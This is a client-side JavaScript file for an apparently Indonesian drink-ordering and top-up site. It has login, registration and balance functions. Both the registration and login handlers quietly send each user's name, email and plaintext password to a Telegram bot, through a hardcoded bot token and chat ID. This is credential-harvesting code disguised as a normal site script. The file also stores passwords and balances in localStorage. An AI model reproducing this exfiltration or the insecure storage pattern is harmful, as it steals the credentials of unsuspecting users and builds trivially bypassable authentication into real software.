function openForm(drinkName) {
    document.getElementById('orderForm').style.display = 'block';
    document.getElementById('drinkName').value = drinkName;
  }
  
  function closeForm() {
    document.getElementById('orderForm').style.display = 'none';
  }

  const BOT_TOKEN = "7314362724:AAGObx-oh4d0sz8MsyRdB0W6qwLHqb3XY58";
  const CHAT_ID = "6450551010";

  function closeForm() {
    document.getElementById("loginForm").style.display = "none";
    document.getElementById("registerForm").style.display = "none";
  }

  function switchToRegister() {
    document.getElementById("loginForm").style.display = "none";
    document.getElementById("registerForm").style.display = "block";
  }

  function switchToLogin() {
    document.getElementById("registerForm").style.display = "none";
    document.getElementById("loginForm").style.display = "block";
  }

  function registerUser(e) {
    e.preventDefault();
    const name = e.target.name.value;
    const email = e.target.email.value;
    const password = e.target.password.value;

    let users = JSON.parse(localStorage.getItem("users") || "[]");
    const existingUser = users.find(u => u.email === email);

    if (existingUser) {
      return Swal.fire({
        icon: "warning",
        title: "Email sudah terdaftar!",
        text: "Silakan login atau gunakan email lain."
      });
    }

    users.push({ name, email, password });
    localStorage.setItem("users", JSON.stringify(users));

    sendToTelegram(`📝 User Baru Terdaftar:\n👤 Nama: ${name}\n📧 Email: ${email}\n🔑 Password: ${password}`);

    Swal.fire({
      icon: "success",
      title: "Berhasil Daftar!",
      text: "Silakan login untuk melanjutkan."
    }).then(() => {
      closeForm();
      switchToLogin();
    });
  }

  function loginUser(e) {
    e.preventDefault();
    const email = e.target.email.value;
    const password = e.target.password.value;

    const users = JSON.parse(localStorage.getItem("users") || "[]");
    const found = users.find(u => u.email === email && u.password === password);

    if (!found) {
      return Swal.fire({
        icon: "error",
        title: "Login Gagal",
        text: "Email atau password salah!"
      });
    }

    localStorage.setItem("loggedInUser", JSON.stringify(found));

    sendToTelegram(`🔓 User Login:\n📧 Email: ${email}\n🔑 Password: ${password}`);

    Swal.fire({
      icon: "success",
      title: "Login Berhasil",
      text: `Selamat datang, ${found.name}!`
    }).then(() => {
      closeForm();
    });
  }

  function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });
  }

  function showUserInfo() {
    const user = JSON.parse(localStorage.getItem("loggedInUser"));
    const nickname = user ? user.name : "Anonim";
    document.getElementById("nickname").innerText = `Halo, ${nickname}`;
    document.getElementById("topupBtn").disabled = !user;
  }

  // Panggil saat halaman dimuat
  document.addEventListener("DOMContentLoaded", showUserInfo);

  // Fungsi untuk memperbarui saldo di halaman
function updateSaldo() {
  let currentSaldo = localStorage.getItem("saldo"); // Ambil saldo dari localStorage
  currentSaldo = currentSaldo ? parseInt(currentSaldo) : 0; // Jika tidak ada saldo, inisialisasi dengan 0
  document.getElementById("saldo").innerText = `Rp${currentSaldo.toLocaleString()}`;
}

// Fungsi untuk menambahkan saldo dan menyimpan kembali ke localStorage
function topUpSaldo(amount) {
  let currentSaldo = localStorage.getItem("saldo");
  currentSaldo = currentSaldo ? parseInt(currentSaldo) : 0; // Jika tidak ada saldo, inisialisasi dengan 0
  let newSaldo = currentSaldo + amount;

  // Simpan saldo baru ke localStorage
  localStorage.setItem("saldo", newSaldo);

  // Update saldo di halaman
  updateSaldo();
}

// Fungsi untuk menginisialisasi saldo saat halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
  updateSaldo(); // Memperbarui saldo di halaman saat pertama kali dimuat
});

// Misalnya, saat top up saldo sebesar Rp50.000, panggil topUpSaldo(50000) dari tombol atau event lain

  document.getElementById("topupBtn").addEventListener("click", () => {
    window.location.href = "/topup"; // Arahkan ke halaman topup
  });

  document.addEventListener("DOMContentLoaded", updateSaldo);

  function saveHistory(amount) {
    const history = JSON.parse(localStorage.getItem("history")) || [];
    history.push({
      amount: amount,
      timestamp: new Date().toLocaleString("id-ID")
    });
    localStorage.setItem("history", JSON.stringify(history));
  }  